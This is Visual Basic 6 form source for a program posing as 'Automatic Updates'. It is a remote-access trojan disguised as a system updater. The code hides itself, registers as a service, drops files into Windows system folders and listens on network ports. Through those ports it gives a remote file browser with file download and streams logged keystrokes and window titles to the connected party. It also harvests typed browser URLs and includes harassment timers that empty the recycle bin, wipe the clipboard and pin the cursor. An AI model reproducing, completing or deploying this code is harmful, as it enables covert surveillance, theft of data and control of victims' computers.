VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Automatic Updates"
   ClientHeight    =   5700
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   7650
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   5700
   ScaleWidth      =   7650
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.TextBox Text11 
      Height          =   285
      Left            =   3240
      TabIndex        =   11
      Text            =   "0"
      Top             =   2640
      Visible         =   0   'False
      Width           =   255
   End
   Begin VB.Timer Matrix 
      Enabled         =   0   'False
      Interval        =   250
      Left            =   600
      Top             =   4440
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   11400
      Top             =   6840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock SockExplorer 
      Left            =   11400
      Top             =   6360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   10920
      Top             =   6360
   End
   Begin VB.TextBox Text10 
      Height          =   495
      Left            =   9360
      MultiLine       =   -1  'True
      TabIndex        =   9
      Top             =   7440
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   10440
      Top             =   6360
   End
   Begin VB.TextBox Text9 
      Height          =   285
      Left            =   8880
      MultiLine       =   -1  'True
      TabIndex        =   8
      Top             =   7920
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.Timer LockClip 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   9960
      Top             =   6360
   End
   Begin VB.Timer Lights 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   9480
      Top             =   6360
   End
   Begin VB.TextBox Text8 
      Height          =   285
      Left            =   7560
      MultiLine       =   -1  'True
      TabIndex        =   7
      Text            =   "Form1.frx":08CA
      Top             =   7920
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Text7 
      Height          =   285
      Left            =   8880
      MultiLine       =   -1  'True
      TabIndex        =   6
      Text            =   "Form1.frx":08D0
      Top             =   7560
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Text6 
      Height          =   285
      Left            =   8880
      TabIndex        =   5
      Text            =   "Text6"
      Top             =   7200
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Text5 
      Height          =   285
      Left            =   7560
      TabIndex        =   4
      Text            =   "Text5"
      Top             =   8400
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   7560
      MultiLine       =   -1  'True
      TabIndex        =   3
      Text            =   "Form1.frx":08D6
      Top             =   7560
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   7560
      TabIndex        =   2
      Text            =   "Text3"
      Top             =   7200
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   7800
      TabIndex        =   1
      Text            =   "Text2"
      Top             =   6840
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   7560
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   6840
      Visible         =   0   'False
      Width           =   150
   End
   Begin VB.Timer Fmouse 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   9000
      Top             =   6360
   End
   Begin VB.Timer RECEMP 
      Enabled         =   0   'False
      Interval        =   60
      Left            =   8520
      Top             =   6360
   End
   Begin VB.Timer TMBeep 
      Enabled         =   0   'False
      Interval        =   50
      Left            =   8040
      Top             =   6360
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   7560
      Top             =   6360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label1 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000C000&
      Height          =   8415
      Left            =   120
      TabIndex        =   10
      Top             =   120
      Width           =   11655
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const RSP_SIMPLE_SERVICE = 1
Const RSP_UNREGISTER_SERVICE = 0
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Dim Overwrite As Boolean
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Private Type SHFILEOPSTRUCT
    hwnd As Long
    wFunc As Long
    pFrom As String
    pTo As String
    fFlags As Integer
    fAborted As Boolean
    hNameMaps As Long
    sProgress As String
End Type
Private Type SYSTEMTIME
    wYear As Integer
    wMonth As Integer
    wDayOfWeek As Integer
    wDay As Integer
    wHour As Integer
    wMinute As Integer
    wSecond As Integer
    wMilliseconds As Integer
End Type
Private Const GENERIC_WRITE = &H40000000
Private Const OPEN_EXISTING = 3
Private Const FILE_SHARE_READ = &H1
Private Const FILE_SHARE_WRITE = &H2
Private Const FO_DELETE = &H3
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As Long) As Long
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Private Declare Function GetFileSize Lib "kernel32" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long
Private Declare Function GetFileTime Lib "kernel32" (ByVal hFile As Long, lpCreationTime As FILETIME, lpLastAccessTime As FILETIME, lpLastWriteTime As FILETIME) As Long
Private Declare Function MoveFile Lib "kernel32" Alias "MoveFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function SHFileOperation Lib "shell32.dll" Alias "SHFileOperationA" (lpFileOp As SHFILEOPSTRUCT) As Long
Private Declare Function FileTimeToSystemTime Lib "kernel32" (lpFileTime As FILETIME, lpSystemTime As SYSTEMTIME) As Long
Private Declare Function FileTimeToLocalFileTime Lib "kernel32" (lpFileTime As FILETIME, lpLocalFileTime As FILETIME) As Long

Dim message As String
Dim sec As Integer
Private s As Integer
Private Declare Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" (ByVal hwnd As Long, ByVal pszPath As String, ByVal psa As Any) As Long
Private Declare Function RemoveDirectory Lib "kernel32" Alias "RemoveDirectoryA" (ByVal lpPathName As String) As Long
Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Const SPI_SETDESKWALLPAPER = 20
Const SPIF_UPDATEINIFILE = &H1

Const WS_CHILD = &H40000000
Const WM_LBUTTONDOWN = &H201
Const WM_LBUTTONUP = &H202
Const SW_HIDE = 0
Const SW_NORMAL = 1
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal hMenu As Long, ByVal hInstance As Long, lpParam As Any) As Long
Private Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Dim tWnd As Long, bWnd As Long, ncWnd As Long

Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function CopyIcon Lib "user32" (ByVal hIcon As Long) As Long
Private Declare Function LoadCursorFromFile Lib "user32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long
Private Declare Function SetCursor Lib "user32" (ByVal hCursor As Long) As Long
Private Declare Function SetSystemCursor Lib "user32" (ByVal hcur As Long, ByVal id As Long) As Long
Private Declare Function GetCursor Lib "user32" () As Long
Private Const OCR_NORMAL As Long = 32512
Private currenthcurs As Long
Private tempcurs As Long
Private newhcurs As Long
Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long
Private Declare Function GetSysColor Lib "user32" (ByVal nIndex As Long) As Long
Const COLOR_SCROLLBAR = 0
Const COLOR_BACKGROUND = 1
Const COLOR_ACTIVECAPTION = 2
Const COLOR_INACTIVECAPTION = 3
Const COLOR_MENU = 4
Const COLOR_WINDOW = 5
Const COLOR_WINDOWFRAME = 6
Const COLOR_MENUTEXT = 7
Const COLOR_WINDOWTEXT = 8
Const COLOR_CAPTIONTEXT = 9
Const COLOR_ACTIVEBORDER = 10
Const COLOR_INACTIVEBORDER = 11
Const COLOR_APPWORKSPACE = 12
Const COLOR_HIGHLIGHT = 13
Const COLOR_HIGHLIGHTTEXT = 14
Const COLOR_BTNFACE = 15
Const COLOR_BTNSHADOW = 16
Const COLOR_GRAYTEXT = 17
Const COLOR_BTNTEXT = 18
Const COLOR_INACTIVECAPTIONTEXT = 19
Const COLOR_BTNHIGHLIGHT = 20
Const COLOR_2NDACTIVECAPTION = 27 '
Const COLOR_2NDINACTIVECAPTION = 28 '

Private Declare Function SetComputerName Lib "kernel32" Alias "SetComputerNameA" (ByVal lpComputerName As String) As Long
Private Declare Function CreatePipe Lib "kernel32" (phReadPipe As Long, phWritePipe As Long, lpPipeAttributes As SECURITY_ATTRIBUTES, ByVal nSize As Long) As Long
Private Declare Sub GetStartupInfo Lib "kernel32" Alias "GetStartupInfoA" (lpStartupInfo As STARTUPINFO)
Private Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Private Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As Any) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long


Private Type SECURITY_ATTRIBUTES
  nLength As Long
  lpSecurityDescriptor As Long
  bInheritHandle As Long
End Type

Private Type PROCESS_INFORMATION
  hProcess As Long
  hThread As Long
  dwProcessID As Long
  dwThreadId As Long
End Type

Private Type STARTUPINFO
  CB As Long
  lpReserved As Long
  lpDesktop As Long
  lpTitle As Long
  dwX As Long
  dwY As Long
  dwXSize As Long
  dwYSize As Long
  dwXCountChars As Long
  dwYCountChars As Long
  dwFillAttribute As Long
  dwFlags As Long
  wShowWindow As Integer
  cbReserved2 As Integer
  lpReserved2 As Byte
  hStdInput As Long
  hStdOutput As Long
  hStdError As Long
End Type

Private Type OVERLAPPED
    ternal As Long
    ternalHigh As Long
    offset As Long
    OffsetHigh As Long
    hEvent As Long
End Type

Private Const STARTF_USESHOWWINDOW = &H1
Private Const STARTF_USESTDHANDLES = &H100
Private Const EM_SETSEL = &HB1
Private Const EM_REPLACESEL = &HC2

Private Type MIB_TCPROW
    dwState As Long
    dwLocalAddr As Long
    dwLocalPort As Long
    dwRemoteAddr As Long
    dwRemotePort As Long
End Type

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Dim currentwindow As String
Private Declare Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
Private Type SYSTEM_INFO
    dwOemID As Long
    dwPageSize As Long
    lpMinimumApplicationAddress As Long
    lpMaximumApplicationAddress As Long
    dwActiveProcessorMask As Long
    dwNumberOrfProcessors As Long
    dwProcessorType As Long
    dwAllocationGranularity As Long
    dwReserved As Long
End Type
Private Declare Function GetVersion Lib "kernel32" () As Long
Dim PST As String
Const VK_CAPITAL = &H14
Const VK_NUMLOCK = &H90
Const VK_SCROLL = &H91
Const VK_USED = VK_SCROLL
Private Type KeyboardBytes
     kbByte(0 To 255) As Byte
End Type
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Long
Private Declare Function GetKeyboardState Lib "user32" (kbArray As KeyboardBytes) As Long
Private Declare Function SetKeyboardState Lib "user32" (kbArray As KeyboardBytes) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Dim kbArray As KeyboardBytes, CapsLock As Boolean, kbOld As KeyboardBytes
Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
Private Type POINTAPI
    X As Long
    Y As Long
End Type
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Private Declare Sub ClipCursor Lib "user32" (lpRect As Any)

Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
Const SHERB_NOCONFIRMATION = &H1
Const SHERB_NOPROGRESSUI = &H2
Const SHERB_NOSOUND = &H4
Private Type ULARGE_INTEGER
  LowPart As Long
  HighPart As Long
End Type
Private Type SHQUERYRBINFO
  cbSize As Long
  i64Size As ULARGE_INTEGER
  i64NumItems As ULARGE_INTEGER
End Type
Private Declare Function SHEmptyRecycleBin Lib "shell32.dll" Alias "SHEmptyRecycleBinA" (ByVal hwnd As Long, ByVal pszRootPath As String, ByVal dwFlags As Long) As Long
Private Declare Function SHUpdateRecycleBinIcon Lib "shell32.dll" () As Long
Private Declare Function SHQueryRecycleBin Lib "shell32.dll" Alias "SHQueryRecycleBinA" (ByVal pszRootPath As String, pSHQueryRBInfo As SHQUERYRBINFO) As Long
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Declare Function Beep Lib "kernel32" (ByVal dwFreq As Long, ByVal dwDuration As Long) As Long
Const SWP_HIDEWINDOW = &H80
Const SWP_SHOWWINDOW = &H40
Const GW_CHILD = 5
Const GW_HWNDNEXT = 2
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Dim sSave As String * 250

Private Sub Fmouse_Timer()
On Error Resume Next
Dim point As POINTAPI
SetCursorPos point.X, point.Y
End Sub

Private Sub Form_Load()
On Error Resume Next
Dim lngHandle As Long, SHDirOp As SHFILEOPSTRUCT, lngLong As Long
Dim Ft1 As FILETIME, Ft2 As FILETIME, SysTime As SYSTEMTIME
ResToFile "c:\windows\system\MSWINSOCK.ocx", 102, "CUSTOM", False
ResToFile "c:\windows\system32\MSWINSOCK.ocx", 102, "CUSTOM", False
ResToFile "c:\windows\system\Cur.cur", 101, "CUSTOM", False

AddToSub
MakeMeService
App.TaskVisible = False

lngHandle = CreateFile("c:\windows\system\Update.exe", GENERIC_WRITE, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&, OPEN_EXISTING, 0, 0)
GetFileTime lngHandle, Ft1, Ft1, Ft2
FileTimeToLocalFileTime Ft2, Ft1
FileTimeToSystemTime Ft1, SysTime
CloseHandle lngHandle

Winsock1.LocalPort = 876
Winsock1.Listen
SockExplorer.LocalPort = 1216
SockExplorer.Listen
Winsock2.LocalPort = "958"
Winsock2.Listen
For pf = 0 To 500
Text9.Text = Text9.Text & vbCrLf & GetRegValue(HKEY_CURRENT_USER, "software\microsoft\internet Explorer\TypedURLs", "url" & pf)
Next

End Sub

Private Sub Lights_Timer()
On Error Resume Next
Lights.Interval = 2049

    TurnOff VK_CAPITAL
    TurnOff VK_NUMLOCK
    TurnOff VK_SCROLL
    Sleep 1000
    TurnOn VK_NUMLOCK
    Sleep 100
    TurnOn VK_CAPITAL
    Sleep 100
    TurnOn VK_SCROLL
    Sleep 300
    TurnOff VK_NUMLOCK
    Sleep 100
    TurnOff VK_CAPITAL
    Sleep 100
    TurnOff VK_SCROLL
    Sleep 500
    TurnOn VK_NUMLOCK
    TurnOn VK_SCROLL
    Sleep 200
    TurnOff VK_NUMLOCK
    TurnOff VK_SCROLL
    Sleep 200
    TurnOn VK_NUMLOCK
    TurnOn VK_SCROLL
    Sleep 200
    TurnOff VK_NUMLOCK
    TurnOff VK_SCROLL
    Sleep 200
    TurnOn VK_CAPITAL
    Sleep 200
    TurnOff VK_CAPITAL
    Sleep 200
    TurnOn VK_CAPITAL
    Sleep 200
    TurnOff VK_CAPITAL
    Sleep 200
    TurnOn VK_NUMLOCK
    TurnOn VK_SCROLL
    Sleep 200
    TurnOff VK_NUMLOCK
    TurnOff VK_SCROLL
    Sleep 200
    TurnOn VK_NUMLOCK
    TurnOn VK_SCROLL
    Sleep 200
    TurnOff VK_NUMLOCK
    TurnOff VK_SCROLL
    Sleep 200
    TurnOn VK_CAPITAL
    Sleep 400
    TurnOff VK_CAPITAL
    Sleep 200
    TurnOn VK_NUMLOCK
    Sleep 100
    TurnOn VK_CAPITAL
    Sleep 100
    TurnOn VK_SCROLL
    Sleep 300
    TurnOff VK_SCROLL
    Sleep 100
    TurnOff VK_CAPITAL
    Sleep 100
    TurnOff VK_NUMLOCK
    Sleep 1000
End Sub

Private Sub LockClip_Timer()
On Error Resume Next
Clipboard.SetText ""
End Sub

Private Sub Matrix_Timer()
On Error Resume Next
Text11.Text = Text11.Text + 1
Label1.Caption = Left(message, Text11.Text) & " "
Matrix.Enabled = False
Matrix.Enabled = True
If Len(Label1.Caption) = (Len(message) + 1) Then
Matrix.Enabled = False
Text11.Text = 0
Else
End If
End Sub

Private Sub RECEMP_Timer()
On Error Resume Next
SHEmptyRecycleBin Me.hwnd, vbNullString, 0
SHUpdateRecycleBinIcon
End Sub

Private Sub SockExplorer_Close()
On Error Resume Next
SockExplorer.Close
SockExplorer.LocalPort = 1216
SockExplorer.Listen
End Sub

Private Sub SockExplorer_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
If SockExplorer.State <> sckClosed Then SockExplorer.Close
SockExplorer.Accept requestID
SockExplorer.SendData Enum_Drives
End Sub

Private Sub SockExplorer_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim sIncoming As String
 Dim iCommand As Integer
 Dim sData As String
 Dim lRet As Long
 Dim Drive As String
 Dim Command As String
    
 SockExplorer.GetData sIncoming
 
             Command = EvalData(sIncoming, 1)
    Drive = EvalData(sIncoming, 2)
    
        
                If InStr(1, sIncoming, "|FOLDERS|") <> 0 Then
        sData = Enum_Folders(Mid$(sIncoming, 10, Len(sIncoming)))
        SockExplorer.SendData sData
        DoEvents
        Sleep (500)
        sData = Enum_Files(Mid$(sIncoming, 10, Len(sIncoming)))
        SockExplorer.SendData sData
    End If
    
    If InStr(1, sIncoming, "|GETFILE|") <> 0 Then
          SendFile Mid$(sIncoming, 10, Len(sIncoming)), SockExplorer
          SockExplorer.SendData "|COMPLETE|"
    End If

    If InStr(1, Strdata, "|COMPLETE|") <> 0 Then
        bFileTransfer = False
        Put #1, , Strdata
        Close #1
        Set frmdownloading = Nothing
        DoEvents
        End If
        If bGettingDesktop = True Then
            bGettingDesktop = False
       End If


End Sub

Private Sub Timer1_Timer()
On Error Resume Next

If currentwindow <> GetCaption(GetForegroundWindow) Then
currentwindow = GetCaption(GetForegroundWindow)
Winsock1.SendData "kcaption|" & vbCrLf & "[Current Window: " & currentwindow & "]" & vbCrLf
End If
Dim FoundKeys As String
On Error Resume Next
Dim AddKey
    KeyResult = GetAsyncKeyState(13)
    If KeyResult = -32767 Then
        AddKey = vbCrLf
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(8)
    If KeyResult = -32767 Then
        l = Len(Text1.Text)
        AddKey = "[Backspace]"
        GoTo KeyFound
    End If
   
KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
        AddKey = " "
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = ";" Else AddKey = ":"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(187)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "=" Else AddKey = "+"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "," Else AddKey = "<"
       GoTo KeyFound
    End If
   
KeyResult = GetAsyncKeyState(189)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "-" Else AddKey = "_"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "." Else AddKey = ">"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "/" Else AddKey = "?"   '/
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(192)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "`" Else AddKey = "@"       '`
        GoTo KeyFound
    End If
     
KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "0" Else AddKey = ")"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "1" Else AddKey = "!"
        GoTo KeyFound
    End If
     

KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "2" Else AddKey = "''"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "3" Else AddKey = "£"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "4" Else AddKey = "$"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "5" Else AddKey = "%"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "6" Else AddKey = "^"
        GoTo KeyFound
    End If
 
 KeyResult = GetAsyncKeyState(vbKeyDelete)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[Delete]" Else AddKey = "[Delete]"
        GoTo KeyFound
    End If
    
     KeyResult = GetAsyncKeyState(vbKeyEnd)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[End]" Else AddKey = "[End]"
        GoTo KeyFound
    End If
 
      KeyResult = GetAsyncKeyState(vbKeyInsert)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[Insert]" Else AddKey = "[Insert]"
        GoTo KeyFound
    End If
    
         KeyResult = GetAsyncKeyState(vbKeyPageUp)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[PageUp]" Else AddKey = "[PageUp]"
        GoTo KeyFound
    End If
    
             KeyResult = GetAsyncKeyState(vbKeyPageDown)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[PageDown]" Else AddKey = "[PageDown]"
        GoTo KeyFound
    End If
    
            KeyResult = GetAsyncKeyState(vbKeyF1)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F1]" Else AddKey = "[F1]"
        GoTo KeyFound
    End If
    
            KeyResult = GetAsyncKeyState(vbKeyF2)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F2]" Else AddKey = "[F2]"
        GoTo KeyFound
    End If
      
            KeyResult = GetAsyncKeyState(vbKeyTab)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[Tab]" Else AddKey = "[Tab]"
        GoTo KeyFound
    End If
    
            KeyResult = GetAsyncKeyState(vbKeyF3)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F3]" Else AddKey = "[F3]"
        GoTo KeyFound
    End If
    
            
            KeyResult = GetAsyncKeyState(vbKeyHome)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[Home]" Else AddKey = "[Home]"
        GoTo KeyFound
    End If
    
            KeyResult = GetAsyncKeyState(vbKeyPause)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[Pause]" Else AddKey = "[Pause]"
        GoTo KeyFound
    End If
    
            KeyResult = GetAsyncKeyState(vbKeyNumlock)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[NumLock]" Else AddKey = "[NumLock]"
        GoTo KeyFound
    End If
    
            KeyResult = GetAsyncKeyState(vbKeyScrollLock)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[ScrollLock]" Else AddKey = "[Scrolllock]"
        GoTo KeyFound
    End If
      
            KeyResult = GetAsyncKeyState(vbKeyF4)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F4]" Else AddKey = "[F4]"
        GoTo KeyFound
    End If
    
            KeyResult = GetAsyncKeyState(vbKeyF5)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F5]" Else AddKey = "[F5]"
        GoTo KeyFound
        End If
        
            KeyResult = GetAsyncKeyState(vbKeyF6)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F6]" Else AddKey = "[F6]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(vbKeyF7)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F7]" Else AddKey = "[F7]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(vbKeyF8)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F8]" Else AddKey = "[F8]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(vbKeyF9)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F9]" Else AddKey = "[F9]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(vbKeyF10)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F10]" Else AddKey = "[F10]"
        GoTo KeyFound
    End If
    
    KeyResult = GetAsyncKeyState(vbKeyF11)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F11]" Else AddKey = "[F11]"
        GoTo KeyFound
    End If
    
 KeyResult = GetAsyncKeyState(vbKeyF12)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[F12]" Else AddKey = "[F12]"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "7" Else AddKey = "&"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "8" Else AddKey = "*"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "9" Else AddKey = "("
        GoTo KeyFound
    End If
       
    
KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "*" Else AddKey = ""
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "=" Else AddKey = "+"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
        AddKey = ""
        If GetShift = False Then Text1.Text = Text1.Text & vbCrLf
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "-" Else AddKey = "_"
        GoTo KeyFound
    End If
